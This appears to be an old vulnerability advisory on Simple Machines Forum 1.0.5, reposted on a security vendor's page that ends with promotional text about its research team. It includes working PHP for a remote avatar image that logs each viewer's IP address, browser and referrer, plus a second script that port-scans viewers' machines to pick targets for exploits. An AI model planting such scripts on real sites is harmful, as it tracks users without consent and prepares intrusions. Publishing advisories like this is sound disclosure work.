# Simple Machine Forum 1-0-5 (possibly prior versions) user IP address / information disclosure

```
Simple Machine Forum 1-0-5 (possibly prior versions) user IP address /
information disclosure

software:
site: <http://www.simplemachines.org/>

information disclosure:
a user can choose an sumbit an avatar url like this:

http://[evil_site]/image.php

where image.php is a file like this:

<?php
 $log="log".date("Ymd").".txt";
 $fp=fopen($log,'a');
 fputs($fp,$REMOTE_ADDR.":".$REMOTE_PORT." -
".$HTTP_USER_AGENT."-".$HTTP_REFERER."-".$REQUEST_METHOD."-".$QUERY_STRING."-".$HTTP_ACCEPT_LANGUAGE."-".$REQUEST_URI."\r\n");
 fclose($fp)
?>

When forum users view a page that should show the avatar, a new line is appended
to log[date].txt on [evil_site] server, like this:

08.31.05 04.09 - 192.168.1.1:8562 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT
5.1)-http://[target]/[path]/[page]-GET--it-/image.php

so an external user can monitor in details the forum activity, user ip addresses, have informations on OS and browsers
used and so on

the evil script could check for open ports/services on target machines to send
them exploit code or proxies, trojan ports, do some other stuff, just an example:

<?php
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 1);
$log="log".date("Ymd").".txt";
$fp=fopen($log,'a');
fputs($fp,'open ports on '.$REMOTE_ADDR.": ");
$portlist="23;135;139;445;1080;3128;8080;12345";
$ports=explode(";",$portlist);
for ($i=0; $i<=count($ports)-1; $i++)
{
$ock=fsockopen($REMOTE_ADDR,$ports[$i]);
if ($ock) {fputs($fp,$ports[$i].' '); fclose($ock);}
}
fputs($fp,"\r\n");
fclose($fp);
//then a lot of creativity ;)
?>

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
